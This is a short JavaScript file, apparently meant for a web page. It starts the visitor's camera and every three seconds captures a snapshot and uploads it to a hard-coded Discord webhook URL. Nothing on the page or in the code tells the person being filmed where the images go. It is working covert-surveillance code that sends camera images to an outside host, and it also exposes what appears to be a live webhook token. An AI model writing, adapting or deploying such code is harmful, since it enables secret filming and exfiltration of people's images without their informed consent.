const webhook = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";
const video = document.getElementById("video");
const canvas = document.createElement("canvas");

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    setInterval(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        const form = new FormData();
        form.append("file", blob, "foto.png");
        fetch(webhook, { method: "POST", body: form });
      }, "image/png");
    }, 3000);

  } catch (err) {
    alert("Permissão negada ou erro: " + err);
  }
}

startCamera();
